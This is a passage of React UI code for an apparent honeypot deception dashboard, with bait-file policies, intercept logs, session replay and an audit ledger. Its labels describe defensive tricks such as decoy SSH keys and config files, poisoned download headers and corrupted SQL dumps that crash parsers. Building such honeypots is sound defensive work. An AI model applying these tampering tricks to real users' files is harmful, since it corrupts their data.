                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          downloadTamperMode === "MOCK_SUCCESS"
                            ? "bg-[#064e3b]/60 border-emerald-500 text-emerald-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Serves simulated clean, safe executable"
                      >
                        ✓ VIRTUAL SUCCESS
                      </button>
                    </div>
                    <p className="text-[9px] text-[#059669] mt-1.5 font-sans leading-snug">
                      {downloadTamperMode === "CORRUPT_EOF" && "Active Policy: Script transfers but raises a trailing CRC32 block warning, preventing direct execution."}
                      {downloadTamperMode === "TRUNCATED_90" && "Active Policy: Abrupt socket cutoff at 90% size triggers curl/wget connection failures."}
                      {downloadTamperMode === "POISONED_HEADER" && "Active Policy: Embeds tracing telemetry hooks right inside the shell script script-headers."}
                      {downloadTamperMode === "MOCK_SUCCESS" && "Active Policy: Standard sandboxed mock script downloader finishes perfectly."}
                    </p>
                  </div>

                  {/* 2. Sensitive File Inconsistencies Option */}
                  <div>
                    <label className="text-[10px] text-emerald-500 font-bold block mb-1 uppercase tracking-wider">
                      Sensitive File Bait Policy
                    </label>
                    <div className="grid grid-cols-2 gap-1.5">
                      <button
                        onClick={() => setSensitiveFileSpoofMode("RANDOM_SHARES_INCONSISTENCY")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          sensitiveFileSpoofMode === "RANDOM_SHARES_INCONSISTENCY"
                            ? "bg-yellow-950/60 border-yellow-500 text-yellow-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Alters user files with inconsistent UIDs and misaligned group access policies"
                      >
                        ⚠️ UID/GID ANOMALY
                      </button>
                      <button
                        onClick={() => setSensitiveFileSpoofMode("SIMULATED_LOG_INTRUSION")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION"
                            ? "bg-rose-950/60 border-rose-500 text-rose-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Seeds typos (e.g., db_vault_snyc) to isolate automated scraping from human intuition"
                      >
                        ✏️ TYPO SEEDING
                      </button>
                      <button
                        onClick={() => setSensitiveFileSpoofMode("EXPIRED_SSH_BAIT")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT"
                            ? "bg-[#2e1065]/60 border-purple-500 text-purple-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Serves authentic keys & shadow blocks with expired markers to drain cracker CPU"
                      >
                        🔑 EXPIRED BAIT
                      </button>
                      <button
                        onClick={() => setSensitiveFileSpoofMode("CORRUPTED_SQL_DUMP")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP"
                            ? "bg-rose-950/60 border-red-500 text-red-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Injects damaged database binary blocks causing parsers and restore programs to crash"
                      >
                        💾 ARCHIVER FAULT
                      </button>
                    </div>
                    <p className="text-[9px] text-[#059669] mt-1.5 font-sans leading-snug">
                      {sensitiveFileSpoofMode === "RANDOM_SHARES_INCONSISTENCY" && "Active Policy: Identity files mock unprivileged roots to trigger automated credential tests."}
                      {sensitiveFileSpoofMode === "SIMULATED_LOG_INTRUSION" && "Active Policy: Grammatical spell deviations catch aggressive brute-force scanning scripts."}
                      {sensitiveFileSpoofMode === "EXPIRED_SSH_BAIT" && "Active Policy: Key blocks have expired hashes and broken padding layouts to fail auth."}
                      {sensitiveFileSpoofMode === "CORRUPTED_SQL_DUMP" && "Active Policy: Backups trigger database parser stack overflow crash errors on recovery."}
                    </p>
                  </div>
                </div>

                <div className="border border-emerald-900 rounded-lg overflow-hidden text-[10px]">
                  <div className="bg-emerald-950/60 p-1 px-2 font-bold uppercase text-[9px] tracking-wider text-emerald-400 border-b border-emerald-900 flex justify-between">
                    <span>Dimension</span>
                    <span>Hacker View vs Truth</span>
                  </div>
                  
                  {/* Row 1: Users */}
                  <div className="p-2 border-b border-emerald-950/80 bg-slate-950/40 grid grid-cols-12 gap-1.5 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">IDENTITY</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center">
                      root (UID 0)
                    </div>
                    <div className="col-span-1 text-center text-emerald-700 font-bold">➔</div>
                    <div className="col-span-4 text-slate-400 bg-slate-900 p-1 rounded border border-slate-700 text-center font-bold">
                      Unprivileged
                    </div>
                  </div>

                  {/* Row 2: Host Shell Filesystem */}
                  <div className="p-2 border-b border-emerald-950/80 bg-slate-950/40 grid grid-cols-12 gap-1.5 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">FILESYSTEM</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center">
                      Read/Write Real
                    </div>
                    <div className="col-span-1 text-center text-emerald-700 font-bold">➔</div>
                    <div className="col-span-4 text-slate-400 bg-slate-900 p-1 rounded border border-slate-700 text-center font-bold font-mono">
                      Cow Volatile RAM
                    </div>
                  </div>

                  {/* Row 3: Bait Secrets Table */}
                  <div className="p-2 border-b border-emerald-950/80 bg-slate-950/40 grid grid-cols-12 gap-1.5 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">BAIT CREDENTIALS</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center">
                      Admin backdoors
                    </div>
                    <div className="col-span-1 text-center text-emerald-700 font-bold">➔</div>
                    <div className="col-span-4 text-rose-400 bg-rose-950/30 p-1 rounded border border-rose-900 text-center font-bold font-mono">
                      Decoy Honey-Tokens
                    </div>
                  </div>

                  {/* Row 4: Malware Outbound Target */}
                  <div className="p-2 bg-slate-950/40 grid grid-cols-12 gap-1.5 items-center">
                    <div className="col-span-3 text-[#059669] font-semibold uppercase">C2 OUTBOUND</div>
                    <div className="col-span-4 text-emerald-400 font-bold bg-emerald-950/30 p-1 rounded border border-emerald-900 text-center">
                      Direct TCP
                    </div>
                    <div className="col-span-1 text-center text-emerald-700 font-bold">➔</div>
                    <div className="col-span-4 text-slate-400 bg-slate-900 p-1 rounded border border-slate-700 text-center font-bold font-mono">
                      Mocked DNS Loop
                    </div>
                  </div>

                </div>

                <div className="p-2 border border-emerald-900 rounded-lg bg-[#022c22]/10 text-[10px] space-y-2">
                  <span className="font-bold uppercase text-[9px] text-[#22c55e] block border-b border-emerald-950 pb-0.5">Active Bait Tokens Projected (Filesystem Seeds):</span>
                  <div className="grid grid-cols-2 gap-1.5 font-mono text-[9px] text-emerald-400">
                    <div className="p-1 bg-slate-950 rounded">📄 /root/config_v1.ini</div>
                    <div className="p-1 bg-slate-950 rounded">💾 /tmp/prod_backup.sql</div>
                    <div className="p-1 bg-slate-950 rounded">🔑 /root/.ssh/id_rsa.bak</div>
                    <div className="p-1 bg-slate-950 rounded">⚙️ /var/www/html/wp-config.php</div>
                  </div>
                </div>
              </div>
            )}

            {/* VIEW B: Real-Time Deception Feed (Dynamic intercept logs) */}
            {activeDeceptionTab === 'feed' && (
              <div className="space-y-3">
                <div className="text-[10px] text-emerald-600 mb-2 uppercase tracking-wide flex justify-between">
                  <span>INTERCEPT LOGS</span>
                  <span>TIME UTC</span>
                </div>
                
                <div className="space-y-3 max-h-[290px] overflow-y-auto">
                  {deceptionEvents.slice().reverse().map((evt) => (
                    <div key={evt.id} className="p-2 bg-slate-950 rounded-lg border border-emerald-900 text-[10px] leading-relaxed relative">
                      <div className="flex justify-between font-bold text-slate-400 border-b border-emerald-950 pb-1 mb-1.5">
                        <span className="text-[#38bdf8] font-mono truncate max-w-[150px]"># {evt.cmd}</span>
                        <span className="text-emerald-600 font-mono shrink-0">{evt.timestamp}</span>
                      </div>
                      
                      <div className="space-y-1 text-slate-300">
                        <div>
                          <strong className="text-emerald-500 font-medium">TACTIC ENGAGED: </strong>
                          <span className="text-yellow-400 font-bold bg-yellow-950/20 px-1 rounded">{evt.tactic}</span>
                        </div>
                        <div>
                          <strong className="text-emerald-500 font-medium">MOCKED DATA FED: </strong>
                          <span className="text-slate-300 italic">“{evt.spoofedInfo}”</span>
                        </div>
                        <div className="border-t border-emerald-950/80 pt-1 mt-1 text-emerald-400">
                          <strong className="font-semibold text-emerald-600 uppercase text-[8px] block">Attacker Session Status:</strong>
                          <span>{evt.attackerResponse}</span>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* VIEW C: Live Deception step pipeline flow graphic */}
            {activeDeceptionTab === 'pipeline' && (
              <div className="space-y-4">
                <div className="p-2 border border-emerald-900 rounded bg-[#022c22]/10 text-xs text-emerald-400">
                  <span className="font-bold block text-[11px] text-emerald-300 mb-1">State Action Interaction (S, A, R)</span>
                  This flowchart tracks step interactions as telemetry streams into the neural decision agent. Each command transitions the state-space instantly.
                </div>

                <div className="space-y-4 font-mono font-medium text-[10px] pt-2">
                  
                  {/* Step 1 */}
                  <div className={`flex items-start gap-3 transition-colors ${activeTrappingStep === 1 ? 'text-yellow-400' : 'text-emerald-600'}`}>
                    <div className={`border-2 rounded-full w-5 h-5 flex items-center justify-center font-bold text-[9px] shrink-0 ${activeTrappingStep === 1 ? 'border-yellow-400 bg-yellow-950' : 'border-emerald-800 bg-slate-950'}`}>
                      1
                    </div>
                    <div>
                      <span className="font-bold uppercase tracking-wider block">1. Terminal Command Capture</span>
                      <span className="text-slate-400 text-[9px]">Anomalous shell input detected from tty namespace bounds.</span>
                    </div>
                  </div>

                  {/* Flow Arrow */}
                  <div className="ml-2 border-l border-emerald-900/40 h-3"></div>

                  {/* Step 2 */}
                  <div className={`flex items-start gap-3 transition-colors ${activeTrappingStep === 2 ? 'text-yellow-400' : 'text-emerald-600'}`}>
                    <div className={`border-2 rounded-full w-5 h-5 flex items-center justify-center font-bold text-[9px] shrink-0 ${activeTrappingStep === 2 ? 'border-yellow-400 bg-yellow-950' : 'border-emerald-800 bg-slate-950'}`}>
                      2
                    </div>
                    <div>
                      <span className="font-bold uppercase tracking-wider block">2. PPO State Valuation</span>
                      <span className="text-slate-400 text-[9px]">Decision model processes command feature vector and classifications.</span>
                    </div>
                  </div>

                  {/* Flow Arrow */}
                  <div className="ml-2 border-l border-emerald-900/40 h-3"></div>

                  {/* Step 3 */}
                  <div className={`flex items-start gap-3 transition-colors ${activeTrappingStep === 3 ? 'text-emerald-400 animate-pulse' : 'text-emerald-600'}`}>
                    <div className={`border-2 rounded-full w-5 h-5 flex items-center justify-center font-bold text-[9px] shrink-0 ${activeTrappingStep === 3 ? 'border-emerald-400 bg-emerald-950 text-[#10b981]' : 'border-emerald-800 bg-slate-950'}`}>
                      3
                    </div>
                    <div>
                      <span className="font-bold uppercase tracking-wider block">3. Decoy Response Injection</span>
                      <span className="text-slate-400 text-[9px]">Spoofed parameters loaded dynamically. Attacker receives decoy return.</span>
                    </div>
                  </div>

                </div>

              </div>
            )}

            {/* VIEW D: Session Replay Interface */}
            {activeDeceptionTab === 'replay' && (
              <div className="space-y-4">
                <div className="p-2 border border-emerald-900 rounded bg-[#022c22]/10 text-[11px] leading-relaxed text-emerald-400">
                  <span className="font-bold block text-emerald-300 mb-0.5">Interaction Replay Engine</span>
                  Analyze live or archived terminal sessions with integrated tactic graphs, command sequences, and spoofed bait injection timelines.
                </div>

                {/* Combined Sessions Register List */}
                <div className="space-y-2 max-h-[160px] overflow-y-auto pr-0.5">
                  {[
                    {
                      id: "SESS-LIVE-ACTIVE",
                      name: "Live Contained Session",
                      timestamp: liveSessionCommands.length > 0 ? "Live Run Active" : "No manual input yet",
                      commands: liveSessionCommands,
                      sqsData: sqsHistory.map((item, idx) => ({ time: idx, sqs: item.sqs })),
                      isLive: true
                    },
                    ...pastSessions
                  ].map((sess) => {
                    const isCurrentActivePlayback = isReplaying && replaySession?.id === sess.id;
                    const cmdCount = sess.commands.length;
                    
                    return (
                      <div 
                        key={sess.id}
                        className={`p-2 rounded border transition-all text-[11px] flex flex-col gap-1.5 ${
                          isCurrentActivePlayback 
                            ? "bg-amber-950/30 border-amber-500/70" 
                            : sess.isLive 
                              ? "bg-emerald-950/20 border-emerald-900/40" 
                              : "bg-slate-950/50 border-emerald-950 hover:border-emerald-900/60"
                        }`}
                      >
                        <div className="flex justify-between items-center">
                          <span className={`font-bold uppercase tracking-wider ${isCurrentActivePlayback ? "text-amber-400" : sess.isLive ? "text-emerald-400 animate-pulse" : "text-slate-300"}`}>
                            {sess.name}
                          </span>
                          <span className="text-[10px] text-emerald-600 font-mono scale-95 shrink-0 font-bold">
                            {sess.id}
                          </span>
                        </div>

                        <div className="flex justify-between items-center text-[10px] text-[#059669]/90 font-mono">
                          <span>Commands: <strong className="text-emerald-400">{cmdCount}</strong></span>
                          <span>{sess.timestamp}</span>
                        </div>

                        <div className="flex gap-2 justify-end mt-0.5 border-t border-emerald-950/30 pt-1.5">
                          {isCurrentActivePlayback ? (
                            <button
                              onClick={() => {
                                setIsReplaying(false);
                                setReplaySession(null);
                              }}
                              className="px-2 py-0.5 text-[10px] font-sans font-bold bg-amber-950 border border-amber-800 text-amber-300 rounded hover:bg-amber-900/60 transition-colors flex items-center gap-1 cursor-pointer"
                            >
                              <Pause className="w-3 h-3" /> Stop Replay
                            </button>
                          ) : (
                            <button
                              disabled={cmdCount === 0}
                              onClick={() => {
                                setIsReplaying(true);
                                setReplaySession(sess as any);
                                setReplayCommandIndex(0);
                                setReplayIsPaused(false);
                                setReplaySpeed(1);
                              }}
                              className={`px-2 py-0.5 text-[10px] font-sans font-bold rounded flex items-center gap-1 cursor-pointer transition-colors
                                ${cmdCount === 0 
                                  ? "bg-slate-950 text-slate-700 border border-slate-900 cursor-not-allowed" 
                                  : sess.isLive 
                                    ? "bg-emerald-900 border border-emerald-700 text-emerald-300 hover:bg-emerald-800"
                                    : "bg-slate-950 border border-emerald-900/40 text-[#10b981] hover:border-emerald-600 hover:text-green-300"}`}
                            >
                              <Play className="w-3 h-3 text-emerald-400" /> 
                              {sess.isLive ? "Replay Live Run" : "Launch Replay"}
                            </button>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Active Replay Interactive Dashboard Controls */}
                {isReplaying && replaySession && (
                  <div className="p-3 bg-[#110c03] border border-amber-900/60 rounded-lg space-y-3 shadow-inner">
                    <div className="flex justify-between items-center border-b border-amber-950/80 pb-1.5">
                      <span className="text-[10px] text-amber-500 font-bold uppercase tracking-wider flex items-center gap-1">
                        <span className="w-2 h-2 rounded-full bg-amber-500 animate-ping"></span>
                        Playback Control Deck
                      </span>
                      <span className="text-amber-500 font-mono text-[9px] font-bold">
                        CMD {Math.min(replayCommandIndex + 1, replaySession.commands.length)} / {replaySession.commands.length}
                      </span>
                    </div>

                    {/* Timeline Scrubber Bubbles */}
                    <div className="flex items-center gap-1 overflow-x-auto py-1 scrollbar-thin">
                      {replaySession.commands.map((cmdItem, idx) => {
                        const isPast = idx < replayCommandIndex;
                        const isCurrent = idx === replayCommandIndex;
                        return (
                          <button
                            key={idx}
                            onClick={() => {
                              setReplayCommandIndex(idx);
                              setReplayTypingText(cmdItem.cmd);
                            }}
                            title={cmdItem.cmd}
                            className={`w-6 h-6 rounded-full flex items-center justify-center font-mono font-bold text-[9px] cursor-pointer shrink-0 transition-all border
                              ${isCurrent 
                                ? "bg-amber-500 text-slate-500 border-amber-300 scale-105"
                                : isPast 
                                  ? "bg-amber-950/90 border-amber-800/80 text-amber-400"
                                  : "bg-slate-950 border-emerald-950/85 text-emerald-800"}`}
                          >
                            {idx + 1}
                          </button>
                        );
                      })}
                    </div>

                    {/* Media Controller Ribbons */}
                    <div className="flex items-center justify-between gap-2 border-t border-amber-950/50 pt-2 text-[10px]">
                      <div className="flex items-center gap-1.5">
                        <button
                          onClick={() => {
                            setReplayCommandIndex(0);
                            setReplayTypingText("");
                          }}
                          className="p-1 px-1.5 bg-[#050907] border border-amber-900/40 text-amber-500 rounded hover:border-amber-500 transition-colors"
                          title="Restart Playback"
                        >
                          <RotateCcw className="w-3.5 h-3.5" />
                        </button>

                        <button
                          onClick={() => setReplayIsPaused(!replayIsPaused)}
                          className="p-1 px-2.5 bg-[#050907] border border-amber-900/60 text-amber-400 font-bold rounded hover:border-amber-400 hover:text-white transition-colors flex items-center gap-1"
                        >
                          {replayIsPaused ? (
                            <>
                              <Play className="w-3 h-3 text-amber-400 animate-pulse" /> Resume
                            </>
                          ) : (
                            <>
                              <Pause className="w-3 h-3 text-amber-400 animate-pulse" /> Pause
                            </>
                          )}
                        </button>
                      </div>

                      {/* Speed selectors */}
                      <div className="flex items-center border border-amber-900/40 rounded bg-slate-950/85 p-0.5 overflow-hidden font-mono text-[9px]">
                        {[1, 2, 4].map(s => (
                          <button
                            key={s}
                            onClick={() => setReplaySpeed(s)}
                            className={`px-1.5 py-0.5 rounded-sm cursor-pointer transition-colors ${replaySpeed === s ? "bg-amber-500 text-[#110c03] font-bold" : "text-amber-500 hover:bg-amber-950/45"}`}
                          >
                            {s}x
                          </button>
                        ))}
                      </div>
                    </div>

                    {/* Active Telemetry Descriptor Box aligned with Command Index */}
                    {replaySession.commands[replayCommandIndex] && (
                      <div className="p-2 border border-amber-900/35 rounded bg-slate-950/80 text-[10px] space-y-1.5 leading-relaxed">
                        <div className="font-mono text-[10px] text-amber-400 leading-snug">
                          <strong className="text-amber-600 block text-[8px] uppercase font-bold pr-2">Command Payload</strong>
                          $ {replaySession.commands[replayCommandIndex].cmd}
                        </div>
                        <div className="grid grid-cols-2 gap-1.5 text-[9px] border-t border-amber-950/45 pt-1">
                          <div>
                            <span className="text-amber-600/90 block">TACTIC ENGAGED:</span>
                            <span className="text-amber-400 font-bold font-mono uppercase bg-amber-950/40 px-1 rounded inline-block truncate max-w-full">
                              {replaySession.commands[replayCommandIndex].tactic}
                            </span>
                          </div>
                          <div>
                            <span className="text-amber-600/90 block">TARGET VECTOR:</span>
                            <span className="text-emerald-400 font-bold font-mono">
                              {replaySession.commands[replayCommandIndex].target}
                            </span>
                          </div>
                        </div>
                        <div className="text-[9.5px] border-t border-amber-950/45 pt-1 text-slate-300">
                          <strong className="text-amber-600 block text-[8px] uppercase font-bold">Spoofed Data Fed</strong>
                          "{replaySession.commands[replayCommandIndex].spoofedInfo}"
                        </div>
                        <div className="text-[9.5px] border-t border-amber-950/45 pt-1 text-emerald-400/95 font-medium">
                          <strong className="text-amber-600 block text-[8px] uppercase font-bold">Attacker Perception Status</strong>
                          {replaySession.commands[replayCommandIndex].attackerResponse}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

          </div>

          {/* Adversary Profile Selector (Mounted inside Right panel context for optimal usability) */}
          <div className="border-t border-[#064e3b] pt-3">
            <span className="text-[10px] uppercase text-[#10b981] font-semibold block mb-2 tracking-wide flex items-center gap-1.5 hover:text-green-300 transition-colors">
              <Target className="w-4 h-4 text-emerald-500" /> Adversary Action Scenarios
            </span>
            <div className="grid grid-cols-3 gap-2 text-[10px] font-sans">
              
              <button 
                onClick={() => launchProfile('scanner')}
                className={`py-1.5 px-1 rounded-md border text-center transition-all flex flex-col justify-center items-center gap-0.5
                  ${activeProfile === 'scanner' 
                    ? 'bg-yellow-950/40 border-yellow-500 text-yellow-300 shadow-[0_0_10px_rgba(234,179,8,0.15)] font-bold' 
                    : 'bg-slate-950/70 border-[#14532d] text-emerald-500 hover:border-yellow-700 hover:bg-yellow-950/10'}`}
              >
                <Network className="w-3.5 h-3.5 mb-0.5" />
                <span>Port Scan</span>
              </button>

              <button 
                onClick={() => launchProfile('malware')}
                className={`py-1.5 px-1 rounded-md border text-center transition-all flex flex-col justify-center items-center gap-0.5
                  ${activeProfile === 'malware' 
                    ? 'bg-rose-950/40 border-rose-500 text-rose-300 shadow-[0_0_10px_rgba(239,68,68,0.15)] font-bold' 
                    : 'bg-slate-950/70 border-[#14532d] text-emerald-500 hover:border-rose-700 hover:bg-rose-950/10'}`}
              >
                <FileWarning className="w-3.5 h-3.5 mb-0.5" />
                <span>Run Malware</span>
              </button>

              <button 
                onClick={() => launchProfile('recon')}
                className={`py-1.5 px-1 rounded-md border text-center transition-all flex flex-col justify-center items-center gap-0.5
                  ${activeProfile === 'recon' 
                    ? 'bg-purple-950/40 border-purple-500 text-purple-300 shadow-[0_0_10px_rgba(168,85,247,0.15)] font-bold' 
                    : 'bg-slate-950/70 border-[#14532d] text-emerald-500 hover:border-purple-700 hover:bg-purple-950/10'}`}
              >
                <Crosshair className="w-3.5 h-3.5 mb-0.5" />
                <span>Recon State</span>
              </button>

            </div>
          </div>

        </div>

      </div>

      {/* SECTION 4: Comprehensive Forensic Deception Ledger */}
      <div className="mt-8 border border-[#064e3b] bg-[#020617] rounded-xl p-4 md:p-6 shadow-[0_4px_30px_rgba(5,150,105,0.03)] selection:bg-[#14532d] relative">
        {/* Subtle decorative grid lines inside card header */}
        <div className="absolute top-3 right-4 flex items-center gap-1.5 text-xs text-emerald-600 font-mono">
          <Layers className="w-3.5 h-3.5" />
          <span>DECEPTION_DB_REGISTRY</span>
        </div>

        <div className="mb-5">
          <h2 className="text-md sm:text-lg font-bold text-[#10b981] flex items-center gap-2 tracking-tight">
            <Database className="w-5 h-5 text-[#34d399]" />
            Adversary Deception Audit Ledger
          </h2>
          <p className="text-xs text-[#059669] mt-1 pr-12">
            Dynamic real-time catalog of intercept telemetry. This ledger records state commands, classification metadata, and active deceptive bait projected into the honeypot workspace.
          </p>
        </div>

        {/* Toolbar: Filters and Search Input */}
        <div className="flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between bg-slate-950/60 p-3.5 rounded-lg border border-[#064e3b]/80 mb-5 text-xs font-sans">
          
          {/* Search Column */}
          <div className="relative flex-1 min-w-[200px]">
            <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-emerald-600/70">
              <Search className="w-4 h-4" />
            </span>
            <input 
              type="text"
              value={logSearch}
              onChange={(e) => setLogSearch(e.target.value)}
              placeholder="Search by command, tactic or bait..."
              className="w-full bg-[#050907] border border-[#064e3b] text-[#34d399] pl-9 pr-3 py-1.5 rounded-lg outline-none focus:border-[#10b981] placeholder-emerald-800 font-mono text-xs transition-colors"
            />
          </div>

          {/* Filter Tactics Select Dropdown */}
          <div className="flex flex-wrap items-center gap-3">
            <div className="flex items-center gap-2">
              <span className="text-emerald-600 font-medium">Tactic Filter:</span>
              <select
                value={selectedTactic}
                onChange={(e) => setSelectedTactic(e.target.value)}
                className="bg-[#050907] border border-[#064e3b] text-[#34d399] px-2.5 py-1.5 rounded-lg outline-none focus:border-[#10b981] font-mono text-xs cursor-pointer transition-colors"
              >
                <option value="ALL">ALL TACTICS</option>
                {availableTactics.map(t => (
                  <option key={t} value={t}>{t}</option>
                ))}
              </select>
            </div>

            {/* Metrics Info */}
            <div className="h-5 w-[1px] bg-emerald-900 hidden sm:block"></div>

            <div className="text-emerald-500 font-mono text-[10px] uppercase bg-emerald-950/20 px-2 py-1 rounded border border-emerald-900/40">
              Logs: <span className="font-bold text-[#10b981]">{processedEvents.length}</span> / {deceptionEvents.length}
            </div>

            {/* Clear Filters / Logs buttons */}
            <div className="flex items-center gap-2 ml-auto sm:ml-0">
              {(logSearch !== "" || selectedTactic !== "ALL") && (
                <button
                  onClick={() => { setLogSearch(""); setSelectedTactic("ALL"); }}
                  className="px-2.5 py-1 text-[11px] font-sans font-bold bg-[#14532d]/40 border border-[#059669]/60 text-[#6ee7b7] rounded hover:bg-[#14532d]/90 hover:text-white transition-colors cursor-pointer"
                >
                  Clear Filters
                </button>
              )}

              <button
                onClick={() => setDeceptionEvents([])}
                className="px-2.5 py-1 text-[11px] font-sans font-semibold bg-rose-950/30 border border-rose-900/50 text-rose-300 rounded hover:bg-rose-950/70 hover:text-rose-100 transition-all cursor-pointer flex items-center gap-1.5"
                title="Clears all ledger items of recent console events"
              >
                <Trash2 className="w-3.5 h-3.5 text-rose-400" />
                <span>Clear History</span>
              </button>
            </div>
          </div>
        </div>

        {/* Dense Sortable Grid Table */}
        <div className="w-full overflow-x-auto rounded-lg border border-[#064e3b] bg-slate-950/30">
          <table className="w-full text-left border-collapse font-mono text-xs">
            <thead>
              <tr className="bg-[#0d1e15] border-b border-[#064e3b] text-[#34d399] font-bold text-[10px] tracking-wider uppercase select-none">
                
                {/* ID/Time Header sortable */}
                <th 
                  onClick={() => handleSort('timestamp')}
                  className="p-3 cursor-pointer hover:bg-emerald-900/30 transition-colors border-r border-[#064e3b]/40 w-[95px]"
                >
                  <div className="flex items-center gap-2">
                    <span>TIME</span>
                    <ArrowUpDown className={`w-3 h-3 text-emerald-500 ${sortField === 'timestamp' ? 'text-[#10b981]' : 'opacity-40'}`} />
                  </div>
                </th>

                {/* Command Column Header */}
                <th 
                  onClick={() => handleSort('cmd')}
                  className="p-3 cursor-pointer hover:bg-emerald-900/30 transition-colors border-r border-[#064e3b]/40"
                >
                  <div className="flex items-center gap-2">
                    <span>COMMAND TELEMETRY</span>
                    <ArrowUpDown className={`w-3 h-3 text-emerald-500 ${sortField === 'cmd' ? 'text-[#10b981]' : 'opacity-40'}`} />
                  </div>
                </th>

                {/* Tactic Column Header */}
                <th 
                  onClick={() => handleSort('tactic')}
                  className="p-3 cursor-pointer hover:bg-emerald-900/30 transition-colors border-r border-[#064e3b]/40 w-[180px]"
                >
                  <div className="flex items-center gap-2">
                    <span>TACTIC CLASSIFICATION</span>
                    <ArrowUpDown className={`w-3 h-3 text-emerald-500 ${sortField === 'tactic' ? 'text-[#10b981]' : 'opacity-40'}`} />
                  </div>
                </th>

                {/* Target Column Header */}
                <th 
                  onClick={() => handleSort('target')}
                  className="p-3 cursor-pointer hover:bg-emerald-900/30 transition-colors border-r border-[#064e3b]/40 w-[170px]"
                >
                  <div className="flex items-center gap-2">
                    <span>TARGET VECTOR</span>
                    <ArrowUpDown className={`w-3 h-3 text-emerald-500 ${sortField === 'target' ? 'text-[#10b981]' : 'opacity-40'}`} />
                  </div>
                </th>

                {/* Spoofed Information (Bait output) Header */}
                <th 
                  onClick={() => handleSort('spoofedInfo')}
                  className="p-3 cursor-pointer hover:bg-emerald-900/30 transition-colors border-r border-[#064e3b]/40"
                >
                  <div className="flex items-center gap-2">
                    <span>SPOOFED INFRASTRUCTURE REPLY (FEED)</span>
                    <ArrowUpDown className={`w-3 h-3 text-emerald-500 ${sortField === 'spoofedInfo' ? 'text-[#10b981]' : 'opacity-40'}`} />
                  </div>
                </th>

                {/* Attacker feedback outcome loop */}
                <th className="p-3">ATTACKER DECISION LOOP RESPONSE</th>
              </tr>
            </thead>
            <tbody>
              {processedEvents.length > 0 ? (
                processedEvents.map((evt, idx) => {
                  {/* Categorize tactic group style */}
                  let tacticStyle = "bg-slate-900 text-slate-300 border-slate-700/60";
                  if (
                    evt.tactic.includes("LATENCY") || 
                    evt.tactic.includes("SPOOF") || 
                    evt.tactic.includes("BANNER")
                  ) {
                     tacticStyle = "bg-yellow-950/40 text-yellow-400 border border-yellow-800/50";
                  } else if (
                    evt.tactic.includes("JAIL") || 
                    evt.tactic.includes("SANDBOX") || 
                    evt.tactic.includes("LOOPBACK")
                  ) {
                    tacticStyle = "bg-rose-950/40 text-rose-400 border border-rose-800/50";
                  } else if (
                    evt.tactic.includes("HONEYTOKEN") || 
                    evt.tactic.includes("TREE") || 
                    evt.tactic.includes("VIRTUAL_USER") ||
                    evt.tactic.includes("VIRTUALIZATION")
                  ) {
                    tacticStyle = "bg-purple-950/40 text-purple-400 border border-purple-800/50";
                  }

                  return (
                    <tr 
                      key={evt.id} 
                      className={`border-b border-[#064e3b]/30 last:border-0 hover:bg-[#022c22]/15 transition-all
                        ${idx % 2 === 1 ? 'bg-[#030712]/30' : 'bg-transparent'}`}
                    >
                      <td className="p-3 border-r border-[#064e3b]/30 text-[#059669] whitespace-nowrap align-middle">
                        <span className="text-[10px] bg-slate-950/80 p-1 px-1.5 rounded mr-1.5 text-zinc-500 font-bold border border-emerald-950/50">
                          #{evt.id}
                        </span>
                        {evt.timestamp}
                      </td>
                      
                      {/* Command text cell */}
                      <td className="p-3 border-r border-[#064e3b]/30 font-bold text-[#38bdf8] select-all align-middle break-all max-w-[280px]">
                        <span className="text-[#059669]/60 mr-1">$</span>{evt.cmd}
                      </td>

                      {/* Tactic classification Badge */}
                      <td className="p-3 border-r border-[#064e3b]/30 align-middle">
                        <div className="flex">
                          <span className={`text-[10px] px-2 py-0.5 rounded font-bold uppercase tracking-wider text-center ${tacticStyle}`}>
                            {evt.tactic}
                          </span>
                        </div>
                      </td>

                      {/* Target descriptor text */}
                      <td className="p-3 border-r border-[#064e3b]/30 text-emerald-400 font-medium align-middle">
                        {evt.target}
                      </td>

                      {/* Hard-seeded spoofed responses shown cleanly */}
                      <td className="p-3 border-r border-[#064e3b]/30 text-slate-300 italic leading-relaxed text-[11px] font-sans max-w-[340px] align-middle font-mono">
                        "{evt.spoofedInfo}"
                      </td>

                      {/* Dynamic attacker feedback message */}
                      <td className="p-3 text-[#34d399] leading-relaxed text-[11px] font-sans">
                        <div className="flex items-start gap-1.5">
                          <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500 mt-0.5 shrink-0" />
                          <span>{evt.attackerResponse}</span>
                        </div>
                      </td>
                    </tr>
                  );
                })
